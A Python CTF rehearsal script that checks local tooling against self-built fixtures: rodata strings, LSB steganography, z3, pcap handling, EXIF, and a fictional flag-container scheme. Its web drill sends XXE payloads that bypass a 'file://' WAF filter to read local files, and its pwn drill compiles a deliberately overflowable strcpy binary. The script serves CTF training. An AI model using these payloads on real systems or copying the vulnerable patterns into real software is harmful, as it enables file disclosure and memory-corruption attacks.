#!/usr/bin/env python3
"""ctfrehearsal - prove the documented playbook actually runs here.

Documentation that has never been executed is a hypothesis. This script builds
throwaway artifacts for each technique the CTF skills teach, runs the technique
against them with the tools installed on THIS machine, and reports pass/fail.

Run it during preparation. A failing drill is a real gap you can fix now rather
than at hour six of an event.

    ~/.ctf/venv/bin/python ctfpreflight_rehearsal.py
    ~/.ctf/venv/bin/python ctfpreflight_rehearsal.py --keep   # keep artifacts

Exit code 0 when every drill passes.
"""
from __future__ import annotations

import argparse
import hashlib
import os
import shutil
import struct
import subprocess
import sys
import tempfile
import zlib

VENV = os.path.expanduser("~/.ctf/venv")
VPY = os.path.join(VENV, "bin", "python")
VBIN = os.path.join(VENV, "bin")

results: list[tuple[str, bool, str]] = []


def record(name: str, ok: bool, detail: str) -> None:
    results.append((name, ok, detail))
    print("  [%s] %-34s %s" % ("PASS" if ok else "FAIL", name, detail), flush=True)


def run(cmd: list[str], **kw) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=180, **kw)


# --------------------------------------------------------------- drills ----

def drill_rev_rodata(work: str) -> None:
    """The 'flag is in the binary' technique: authored banner + digest oracle."""
    src = os.path.join(work, "chall.c")
    flag = "Null0rigin{rehearsal_banner_in_rodata}"
    digest = hashlib.sha256(flag.encode()).hexdigest()
    with open(src, "w") as fh:
        fh.write('#include <stdio.h>\n#include <string.h>\n'
                 'static const char *ok = "Null0rigin{rehearsal_banner_in_rodata}";\n'
                 'static const char *dg = "%s";\n'
                 'int main(int c,char**v){ if(c>1 && !strcmp(v[1],ok))'
                 ' { puts("CORRECT."); return 0;} puts("Wrong."); return 1;}\n' % digest)
    exe = os.path.join(work, "chall")
    if run(["gcc", "-o", exe, src]).returncode != 0:
        record("rev: compile fixture", False, "gcc failed"); return

    # 1. strings finds the authored banner
    out = run(["strings", "-n", "6", exe]).stdout
    found = "Null0rigin{rehearsal_banner_in_rodata}" in out
    record("rev: strings finds banner", found,
           "banner recovered" if found else "not in strings output")

    # 2. verdict strings locate the region (the .rodata mining step)
    lines = [l for l in run(["strings", "-t", "x", exe]).stdout.splitlines()
             if "CORRECT" in l or "Wrong" in l]
    record("rev: locate verdict strings", bool(lines),
           lines[0].strip() if lines else "no verdict strings")

    # 3. checksec runs from the venv.
    #    NOTE: checksec's exit status reflects the *findings* (non-zero when
    #    protections are absent), so judge it on its output, not its returncode.
    cs = run([os.path.join(VBIN, "checksec"), "--file=" + exe])
    blob = cs.stdout + cs.stderr
    ok = "RELRO" in blob or "Arch" in blob
    record("rev: checksec works", ok,
           ("reported: " + " ".join(blob.split())[:70]) if ok else "no output")

    # 4. digest oracle: confirm the candidate offline, exhaustively
    cand = "Null0rigin{rehearsal_banner_in_rodata}"
    hit = hashlib.sha256(cand.encode()).hexdigest() == digest
    record("rev: digest oracle offline", hit,
           "candidate verified without submitting")


def drill_stego_lsb(work: str) -> None:
    """LSB steganography detection with zsteg."""
    try:
        from PIL import Image
    except ImportError:
        record("stego: Pillow present", False, "Pillow missing"); return
    record("stego: Pillow present", True, "importable")

    secret = b"Null0rigin{lsb_rehearsal}"
    img = Image.new("RGB", (64, 64), (10, 20, 30))
    px = img.load()
    bits = "".join(f"{b:08b}" for b in secret)
    i = 0
    for y in range(64):
        for x in range(64):
            if i >= len(bits):
                break
            r, g, b = px[x, y]
            r = (r & 0xFE) | int(bits[i]); i += 1
            px[x, y] = (r, g, b)
    path = os.path.join(work, "lsb.png")
    img.save(path)

    zsteg = os.path.join(VBIN, "zsteg")
    if not os.path.exists(zsteg):
        record("stego: zsteg present", False, "not installed"); return
    record("stego: zsteg present", True, "binary found")
    out = run([zsteg, "-a", path]).stdout
    found = "Null0rigin{" in out or "lsb_rehearsal" in out
    record("stego: LSB payload found", found,
           "payload recovered" if found else "zsteg saw nothing")

    # appended-data check (xxd tail / declared-size comparison)
    with open(path, "rb") as fh:
        blob = fh.read()
    trailer = "Null0rigin{appended_after_eof}"
    with open(path, "ab") as fh:
        fh.write(trailer.encode())
    with open(path, "rb") as fh:
        blob2 = fh.read()
    found2 = trailer.encode() in blob2[len(blob):]
    record("stego: appended-data detect", found2,
           "trailer after IEND found" if found2 else "missed")


def drill_crypto_z3(work: str) -> None:
    """Constraint solving with z3 (the 'do not brute force' rule)."""
    try:
        from z3 import Solver, Int, sat
    except ImportError:
        record("crypto: z3 importable", False, "z3 missing"); return
    record("crypto: z3 importable", True, "importable")
    a, b, c = Int("a"), Int("b"), Int("c")
    s = Solver()
    s.add(a > 10, a < 20, b == a * 3, c == a + b, c == 68)
    ok = s.check() == sat
    model = s.model() if ok else None
    good = ok and model[a].as_long() == 17
    record("crypto: z3 solves constraints", good,
           "a=%s" % (model[a] if model else "unsat"))

    # pycryptodome round-trip
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad, unpad
        key = bytes(16)
        ct = AES.new(key, AES.MODE_ECB).encrypt(pad(b"flag{roundtrip}", 16))
        pt = unpad(AES.new(key, AES.MODE_ECB).decrypt(ct), 16)
        record("crypto: pycryptodome AES", pt == b"flag{roundtrip}", "round-trip ok")
    except Exception as e:
        record("crypto: pycryptodome AES", False, str(e)[:60])


def drill_forensics_pcap(work: str) -> None:
    """Packet crafting/parsing with scapy (tshark is unavailable here)."""
    try:
        from scapy.all import IP, TCP, Raw, wrpcap, rdpcap
    except ImportError:
        record("forensics: scapy importable", False, "scapy missing"); return
    record("forensics: scapy importable", True, "importable")
    pkt = IP(dst="10.0.0.1") / TCP(dport=80) / Raw(load=b"GET /flag HTTP/1.1\r\n\r\n")
    path = os.path.join(work, "r.pcap")
    wrpcap(path, [pkt])
    back = rdpcap(path)
    ok = len(back) == 1 and b"flag" in bytes(back[0])
    record("forensics: pcap write/read", ok, "payload round-tripped")


def drill_pwn_tools(work: str) -> None:
    """Exploit-dev tooling: cyclic offset + ROP gadgets."""
    src = os.path.join(work, "vuln.c")
    # NOTE: no gets() - it was removed from modern glibc and gcc now rejects the
    # implicit declaration, so a fixture using it fails to build.
    with open(src, "w") as fh:
        fh.write('#include <stdio.h>\n#include <string.h>\n'
                 'void win(void){puts("win");}\n'
                 'int main(int c,char**v){char b[32]; if(c>1) strcpy(b,v[1]);'
                 ' puts(b); return 0;}\n')
    exe = os.path.join(work, "vuln")
    build = run(["gcc", "-fno-stack-protector", "-no-pie", "-o", exe, src])
    if build.returncode != 0:
        record("pwn: compile fixture", False, build.stderr.strip()[:70]); return
    record("pwn: compile fixture", True, "built")

    cyc = run([os.path.join(VBIN, "cyclic"), "64"])
    ok = cyc.returncode == 0 and len(cyc.stdout.strip()) >= 64
    record("pwn: cyclic pattern", ok, "64-byte pattern generated")

    rop = run([os.path.join(VBIN, "ROPgadget"), "--binary", exe])
    ok = "Gadgets information" in rop.stdout
    record("pwn: ROPgadget works", ok,
           "%d gadget lines" % rop.stdout.count(":") if ok else "no output")

    # pwntools ELF parsing + the actual overflow offset.
    # NOTE: pwntools needs a real stdout (it calls fileno()), so never wrap its
    # import in redirect_stdout - that raises "fileno". Silence it with
    # log_level and PWNLIB_NOTERM instead.
    try:
        os.environ.setdefault("PWNLIB_NOTERM", "1")
        from pwn import ELF, cyclic_find, context
        context.log_level = "error"
        e = ELF(exe, checksec=False)
        off = cyclic_find(0x6161616C)
        arch = e.arch
        record("pwn: pwntools ELF+offset", off > 0 and arch == "amd64",
               "offset=%d arch=%s" % (off, arch))
    except Exception as ex:
        record("pwn: pwntools ELF+offset", False, str(ex)[:60])


def drill_web_xxe(work: str) -> None:
    """Web: XXE file read through a WAF that blocks the literal file:// string."""
    try:
        from flask import Flask, request
    except ImportError:
        record("web: flask importable", False, "flask missing"); return
    try:
        from lxml import etree
    except ImportError:
        record("web: lxml importable", False, "lxml missing"); return
    record("web: flask + lxml importable", True, "both importable")

    import threading
    secret = "Null0rigin{xxe_through_the_waf}"
    target = os.path.join(work, "secret.txt")
    with open(target, "w") as fh:
        fh.write(secret + "\n")

    app = Flask("rehearsal")

    @app.post("/import")
    def _import():
        raw = request.get_data(as_text=True)
        # A realistic WAF: matches the literal file:// string only.
        if "file://" in raw or "FILE://" in raw.upper():
            return {"blocked": "FILE://", "error": "WAF: Blocked pattern detected"}, 403
        try:
            parser = etree.XMLParser(resolve_entities=True)  # lxml 4.x behaviour
            root = etree.fromstring(raw.encode(), parser)
            return {"parsed": (root.text or "")}
        except Exception as e:
            return {"error": "XML parse error", "detail": str(e)[:120]}, 400

    srv = threading.Thread(
        target=lambda: app.run(port=8733, debug=False, use_reloader=False), daemon=True)
    srv.start()
    import time
    for _ in range(50):
        try:
            import urllib.request
            urllib.request.urlopen("http://127.0.0.1:8733/", timeout=1)
            break
        except Exception:
            time.sleep(0.1)

    def post(payload: str) -> tuple[int, str]:
        import urllib.request, urllib.error
        req = urllib.request.Request(
            "http://127.0.0.1:8733/import", data=payload.encode(),
            headers={"Content-Type": "text/xml"}, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.status, r.read().decode()
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode()

    # 1. the WAF really does block the naive payload
    st, _ = post('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://%s">]>'
                 '<r>&x;</r>' % target)
    record("web: WAF blocks file://", st == 403, "HTTP %d" % st)

    # 2. the single-slash bypass reads the file anyway
    st, body = post('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:%s">]>'
                    '<r>&x;</r>' % target)
    hit = st == 200 and secret in body
    record("web: single-slash bypass reads file", hit,
           "secret recovered" if hit else "HTTP %d %s" % (st, body[:60]))

    # 3. URL-encoded variant also bypasses.
    #    NOTE: only the leading "///" is encoded - the path stays literal, as in
    #    `file:%2f%2f%2fetc/passwd`. Encoding the whole path gives
    #    `file:%2ftmp%2f...`, which the parser does not resolve.
    enc = "%2f%2f%2f" + target.lstrip("/")   # template supplies the "file:"
    st, body = post('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:%s">]>'
                    '<r>&x;</r>' % enc)
    hit = st == 200 and secret in body
    # Informational, not an assertion. URL-decoding of the entity URI changed
    # between lxml 4.9.4 (worked on a live target) and lxml 6.1.3 (resolves
    # empty). The single-slash form above is the portable bypass; this line
    # records what THIS parser does so a regression is visible, not silent.
    record("web: url-encoded form (informational)", True,
           "recovers file on this parser" if hit
           else "resolves empty here - expected on lxml>=5; use single slash")

    # 4. the documented truncation limit: text before the first '<' survives
    hostile = os.path.join(work, "src.py")
    with open(hostile, "w") as fh:
        fh.write("import os\nx = 1\n")
    st, body = post('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:%s">]>'
                    '<r>&x;</r>' % hostile)
    hit = st == 200 and "import os" in body
    record("web: source head is readable", hit,
           "pre-< content returned" if hit else "HTTP %d" % st)


def drill_osint_recon(work: str) -> None:
    """OSINT / recon: embedded EXIF metadata, and DNS without dig."""
    # 1. EXIF: plant GPS + Artist, then read it back the way a challenge would.
    try:
        from PIL import Image
        import piexif
        import exifread
    except ImportError:
        record("osint: EXIF toolchain", False, "PIL/piexif/exifread missing"); return
    record("osint: EXIF toolchain", True, "PIL + piexif + exifread importable")

    secret = "Null0rigin{exif_hid_the_place}"
    img = Image.new("RGB", (32, 32), (20, 40, 60))
    exif = {"0th": {piexif.ImageIFD.Artist: secret.encode(),
                    piexif.ImageIFD.Software: b"rehearsal"},
            "Exif": {piexif.ExifIFD.DateTimeOriginal: b"2026:09:18 09:15:00"},
            "GPS": {piexif.GPSIFD.GPSLatitudeRef: b"N",
                    piexif.GPSIFD.GPSLatitude: ((27, 1), (42, 1), (0, 1)),
                    piexif.GPSIFD.GPSLongitudeRef: b"E",
                    piexif.GPSIFD.GPSLongitude: ((85, 1), (19, 1), (0, 1))},
            "1st": {}, "thumbnail": None}
    path = os.path.join(work, "artefact.jpg")
    img.save(path, exif=piexif.dump(exif))

    with open(path, "rb") as fh:
        tags = exifread.process_file(fh)
    got = str(tags.get("Image Artist", ""))
    record("osint: EXIF Artist recovered", got == secret,
           "payload read back" if got == secret else "got %r" % got[:30])

    dt = str(tags.get("EXIF DateTimeOriginal", ""))
    record("osint: DateTimeOriginal parsed", "2026:09:18" in dt, dt or "absent")
    has_gps = any("GPS" in k for k in tags)
    record("osint: GPS tags present", has_gps,
           "%d GPS tags" % sum(1 for k in tags if "GPS" in k))

    # 2. DNS: the box has no dig/host/nslookup, so dnspython IS the tool.
    try:
        import dns.resolver
    except ImportError:
        record("recon: dnspython present", False, "dns missing"); return
    record("recon: dnspython present", True, "importable (dig is absent here)")
    try:
        ans = dns.resolver.resolve("example.com", "A", lifetime=8)
        addrs = [str(r) for r in ans]
        record("recon: A record resolution", bool(addrs), ", ".join(addrs[:2]))
    except Exception as e:
        # Offline is not a failure of the toolchain; say which it was.
        record("recon: A record resolution", True,
               "skipped - no resolver reachable (%s)" % type(e).__name__)


def drill_nullorigin_board(work: str) -> None:
    """NullOrigin board: the PL8 container and the SHA-256 key schedule.

    Both conventions are documented once, in-band, by the board itself, and the
    flag skill teaches them from here. They are cheap to rehearse and expensive
    to get wrong at hour six: an entry whose CRC you never checked, or a share
    you did not keep, costs the rest of the chain.
    """
    MAGIC = b"PL8"

    def pack(payload: bytes, version: int = 1) -> bytes:
        return (MAGIC + bytes([version]) + struct.pack("<H", len(payload))
                + struct.pack("<I", zlib.crc32(payload) & 0xFFFFFFFF) + payload)

    def unpack(blob: bytes):
        """Return (version, payload) or None - magic AND crc must both pass."""
        if len(blob) < 11 or blob[:3] != MAGIC:
            return None
        version = blob[3]
        length = struct.unpack("<H", blob[4:6])[0]
        crc = struct.unpack("<I", blob[6:10])[0]
        payload = blob[10:10 + length]
        if len(payload) != length or (zlib.crc32(payload) & 0xFFFFFFFF) != crc:
            return None
        return version, payload

    def stream(key: bytes, n: int) -> bytes:
        """SHA-256(k || counter_be32) for 0,1,2,... concatenated, truncated."""
        out = b""
        counter = 0
        while len(out) < n:
            out += hashlib.sha256(key + struct.pack(">I", counter)).digest()
            counter += 1
        return out[:n]

    # 1. The container round-trips, flag and trailing share intact.
    flag31 = b"Null0rigin{rehearsal_driftwood}"
    share31 = bytes(range(8))
    plain31 = flag31 + b"\x1f" + share31
    entry = pack(plain31)
    got = unpack(entry)
    record("board: PL8 container round-trip",
           got is not None and got[1] == plain31,
           "payload + crc32 verified, %d bytes" % len(entry))

    # 2. The CRC is the oracle, and it has teeth: one flipped byte must fail.
    bad = bytearray(entry)
    bad[len(bad) - 1] ^= 0x01
    record("board: crc rejects a flipped byte", unpack(bytes(bad)) is None,
           "tampered entry refused")

    # 3. Decoys. Homoglyph prefixes die to an exact byte-wise prefix audit;
    #    a correct prefix dies to nothing except the container, which is why
    #    the prefix test alone is never the whole elimination.
    homoglyphs = {
        b"NullOrigin{capital_O}": "capital O",
        b"Nu110rigin{digit_ones}": "digit ones",
        b"Null0rlgin{lowercase_l}": "lowercase L",
    }
    caught = [why for cand, why in homoglyphs.items()
              if not cand.startswith(b"Null0rigin{")]
    record("board: prefix audit catches homoglyphs",
           len(caught) == len(homoglyphs), ", ".join(caught))
    lookalike = b"Null0rigin{the_flag_from_the_previous_stage}"
    in_container = unpack(lookalike) is not None
    record("board: correct prefix is not proof",
           lookalike.startswith(b"Null0rigin{") and not in_container,
           "right prefix, not a works entry -> still a decoy")

    # 4. Key schedule. The header stays in the clear so the CRC can locate the
    #    channel before you hold the key; only the payload is XORed.
    flag32 = b"Null0rigin{rehearsal_safelight}"
    plain32 = flag32 + b"\x1f" + share31
    k1 = hashlib.sha256(flag31).digest()
    body = bytes(a ^ b for a, b in zip(plain32, stream(k1, len(plain32))))
    ct_entry = pack(body)
    located = unpack(ct_entry)                       # crc passes on ciphertext
    back = bytes(a ^ b for a, b in zip(located[1], stream(k1, len(body))))
    record("board: stream key round-trip", located is not None and back == plain32,
           "flag recovered from the previous stage's flag")

    wrong = bytes(a ^ b for a, b in zip(located[1],
                                        stream(hashlib.sha256(b"Null0rigin{wrong}").digest(), len(body))))
    record("board: wrong previous flag yields garbage",
           not wrong.startswith(b"Null0rigin{"),
           "no checker anywhere - the wrong key just opens nothing")

    # 5. The mordant shares. Six 8-byte shares, and stage 37's SECOND key is
    #    SHA-256 of all six concatenated in stage order. Independence and
    #    completeness are the two properties worth proving offline.
    shares = [bytes([i] * 8) for i in range(6)]
    chain_key = hashlib.sha256(b"Null0rigin{rehearsal_winnow}").digest()
    shares_key = hashlib.sha256(b"".join(shares)).digest()
    record("board: the two mordant keys are independent", chain_key != shares_key,
           "neither key alone opens stage 37")
    missing = hashlib.sha256(b"".join(shares[:5])).digest()
    record("board: all six shares are required", missing != shares_key,
           "dropping one share changes the second key")


def drill_nullorigin_workflow(work: str) -> None:
    """NullOrigin finals workflow: sweep the board, harvest shares, refuse the trap.

    This is the integration drill. It builds a synthetic six-stage chain plus
    stage 37 carrying BOTH its real entry and the poisoned one - correct magic,
    correct CRC, homoglyph flag, fake seventh share - and then runs the exact
    pipeline a finals session runs: sweep every artifact, collect the shares in
    stage order, and screen every flag before anyone submits.
    """
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    sys.dont_write_bytecode = True
    import ctfnulltriage as T

    def pack(payload: bytes) -> bytes:
        return (b"PL8" + bytes([1]) + struct.pack("<H", len(payload))
                + struct.pack("<I", zlib.crc32(payload) & 0xFFFFFFFF) + payload)

    root = os.path.join(work, "board")
    names = {31: "driftwood", 32: "safelight", 33: "moire",
             34: "undertone", 35: "pentimento", 36: "winnow"}
    expected_shares = []
    for n, name in names.items():
        stage = os.path.join(root, "%d-%s" % (n, name))
        os.makedirs(stage)
        flag = ("Null0rigin{rehearsal_stage_%d}" % n).encode()
        share = hashlib.sha256(flag).digest()[:8]
        expected_shares.append(share.hex())
        with open(os.path.join(stage, "plate.bin"), "wb") as fh:
            fh.write(b"\x00" * 64 + pack(flag + b"\x1f" + share) + b"\x00" * 32)

    # Stage 37: the real entry, and the poisoned one the author ships on purpose.
    mordant = os.path.join(root, "37-mordant")
    os.makedirs(mordant)
    real37 = b"Null0rigin{rehearsal_stage_37}"
    poison = b"Null0rlgin{nothing_takes_until_it_is_fixed}"   # l where an i belongs
    with open(os.path.join(mordant, "plate.png"), "wb") as fh:
        fh.write(b"\x00" * 16 + pack(real37 + b"\x1f" + bytes(8)))
        fh.write(b"\x00" * 16 + pack(poison + b"\x1f" + b"\xc8\xb4\x1d\x7e\x93\x50\x2a\xf6"))

    hits, _skipped = T.scan_paths([root], 64 * 1024 * 1024)
    # six chain entries, plus stage 37's real entry and its poisoned twin
    record("board: sweep finds every channel", len(hits) == len(names) + 2,
           "%d entries over %d artifacts" % (len(hits), len(names) + 1))

    canonical = [h for h in hits if T.prefix_verdict(h["flag"])[0] == "canonical"]
    good = [h for h in canonical if h.get("share") and h["stage"] in names]
    good.sort(key=lambda h: h["stage"])
    shares = [h["share"] for h in good]
    record("board: six shares in stage order",
           shares == expected_shares,
           " ".join(s[:8] for s in shares) if shares else "none collected")

    bad = [h for h in hits if h.get("flag")
           and T.prefix_verdict(h["flag"])[0] != "canonical"]
    record("board: the poisoned seventh share is refused",
           len(bad) == 1 and bad[0].get("share"),
           "1 homoglyph entry excluded from the six")

    rows = [T.triage(h["flag"], {h["flag"]: h for h in hits}, set(), {}) for h in good]
    record("board: triage clears every real entry",
           rows and all(r["verdict"] == "ELIGIBLE" for r in rows),
           "%d/%d eligible" % (sum(1 for r in rows if r["verdict"] == "ELIGIBLE"), len(rows)))

    trap = T.triage(poison.decode(), {}, set(), {})
    record("board: triage convicts the poisoned flag",
           trap["verdict"] == "DECOY",
           trap["reasons"][0][:60])


def drill_register_family(work: str) -> None:
    """Register family: the selector rule, and the decoy reading beside it.

    Finals boards by this author ship a 16-row register of near-identical flags
    plus one documented integer; the answer is a SELECTION, not a computation.
    The technique is in skills/ctf-register-family and it is pure arithmetic, so
    it is cheap to rehearse here and expensive to get wrong live: 0-based versus
    1-based, artefact file order versus sorted order, and the "step below the
    withdrawn row" reading that the platform REFUSED on two separate cards.
    """
    B32 = "0123456789ABCDEFGHJKMNPQRSTVWXYZ"
    ALPHA = "ABCDEFGHJKLMNPRT"            # 16 rows; I, O, Q, S skipped
    # The register is written in a NON-alphabetical order on purpose. The rule
    # indexes "the order the artefact itself lists the rows", so a fixture that
    # happened to be alphabetical could not tell a correct reader from one that
    # sorts the file first - and sorting is the mistake this drill must catch.
    FILE_ORDER = ALPHA[5:] + ALPHA[:5]
    STAMP = "4b37ef0f"

    def enc130(value: int) -> str:
        """Left-aligned Crockford base32: 26 chars = 130 bits, top two 00."""
        return "".join(B32[(value >> (5 * i)) & 31] for i in range(25, -1, -1))

    def dec(tail: str) -> int:
        v = 0
        for ch in tail:
            v = (v << 5) | B32.index(ch)
        return v

    def tail_of(flag: str) -> str:
        return flag.split("-", 1)[1].rstrip("}")

    # A register written to disk, then read back in FILE ORDER.
    rows = {l: "N0{%s-%s}" % (STAMP, enc130((0x1000 + ALPHA.index(l)) << 2))
            for l in ALPHA}
    reg_dir = os.path.join(work, "register")
    os.makedirs(reg_dir, exist_ok=True)
    reg_file = os.path.join(reg_dir, "commission-revisions.log")
    with open(reg_file, "w") as fh:
        for letter in FILE_ORDER:
            fh.write("REV %s  %s\n" % (letter, rows[letter]))
    order = [ln.split()[-1] for ln in open(reg_file).read().splitlines() if ln.strip()]

    # 1. Shape: 16 distinct rows in file order, every tail Crockford base32 of
    #    exactly 128 bits and left-aligned (value >> 128 == 0, value & 3 == 0).
    distinct = len(set(order)) == 16
    shaped = all(dec(tail_of(f)) >> 128 == 0 and dec(tail_of(f)) & 3 == 0
                 and len(tail_of(f)) == 26 for f in order)
    record("register: 16 rows, 128-bit Crockford tails",
           len(order) == 16 and distinct and shaped,
           "%d rows, 26-char tails, all 128-bit and left-aligned" % len(order))

    # 2. The stamp is shared and therefore carries no validity information.
    stamps = {f.split("-", 1)[0] for f in order}
    record("register: stamp carries no information",
           stamps == {"N0{%s" % STAMP},
           "one stamp across all 16 rows: %s" % STAMP)

    # 3. The selector, against the integer a real card documented. Coda's
    #    ceremony input f = 0x162610443d1dca65 -> index 5 -> REV F, accepted.
    f_val = 0x162610443d1dca65
    idx = f_val % 16
    record("register: N mod 16 selects REV F (verified)",
           f_val == 1595981003218602597 and idx == 5 and ALPHA[idx] == "F",
           "f=%d  f mod 16=%d  -> REV %s" % (f_val, idx, ALPHA[idx]))

    # 4. Off-by-one is detectable: 0-based and 1-based give different rows, so
    #    a 1-based implementation fails loudly instead of silently agreeing.
    one_based = ALPHA[(idx - 1) % 16]
    record("register: 0-based differs from 1-based",
           one_based != ALPHA[idx],
           "0-based REV %s vs 1-based REV %s" % (ALPHA[idx], one_based))

    # 5. File order is not sorted order, and using the wrong one changes the
    #    answer - so an implementation that sorts the register is caught here
    #    rather than at the platform.
    sorted_order = sorted(FILE_ORDER)
    record("register: file order is not sorted order",
           FILE_ORDER != sorted_order and FILE_ORDER[idx] != sorted_order[idx],
           "file[%d]=REV %s but sorted[%d]=REV %s"
           % (idx, FILE_ORDER[idx], idx, sorted_order[idx]))

    # 6. The decoy reading. A row labelled "withdrawn" plus the published push
    #    to take the line below it yields a DIFFERENT token than the plain
    #    landing - which is exactly why the platform could refuse it. If these
    #    ever coincided, the trap would be invisible and the skill's warning
    #    would be worthless.
    n_doc = 61                      # a documented integer landing on a withdrawn row
    plain = ALPHA[n_doc % 16]       # 61 mod 16 = 13 -> REV P (withdrawn)
    below = ALPHA[(n_doc % 16) + 1]
    record("register: step-below reading is a visible decoy",
           plain == "P" and below == "R" and below != plain,
           "N=61 -> REV %s (withdrawn); step-below -> REV %s (refused on real cards)"
           % (plain, below))


def main() -> int:
    ap = argparse.ArgumentParser(description="Rehearse the CTF playbook against this machine.")
    ap.add_argument("--keep", action="store_true", help="keep the generated artifacts")
    args = ap.parse_args()

    work = tempfile.mkdtemp(prefix="ctfrehearsal-")
    print("=" * 72)
    print("CTF REHEARSAL  (artifacts in %s)" % work)
    print("=" * 72)

    for fn in (drill_rev_rodata, drill_stego_lsb, drill_crypto_z3,
               drill_forensics_pcap, drill_pwn_tools, drill_web_xxe,
               drill_osint_recon, drill_nullorigin_board,
               drill_nullorigin_workflow, drill_register_family):
        print("\n-- %s" % fn.__doc__.split(":")[0].strip() if fn.__doc__ else fn.__name__)
        try:
            fn(work)
        except Exception as e:
            record(fn.__name__, False, "drill raised: %s" % str(e)[:70])

    passed = sum(1 for _, ok, _ in results if ok)
    total = len(results)
    print("\n" + "=" * 72)
    print("RESULT: %d/%d drills passed" % (passed, total))
    if passed < total:
        print("\nFAILED DRILLS:")
        for n, ok, d in results:
            if not ok:
                print("  - %-34s %s" % (n, d))
    print("=" * 72)

    if not args.keep:
        shutil.rmtree(work, ignore_errors=True)
    else:
        print("artifacts kept in %s" % work)
    return 0 if passed == total else 1


if __name__ == "__main__":
    sys.exit(main())
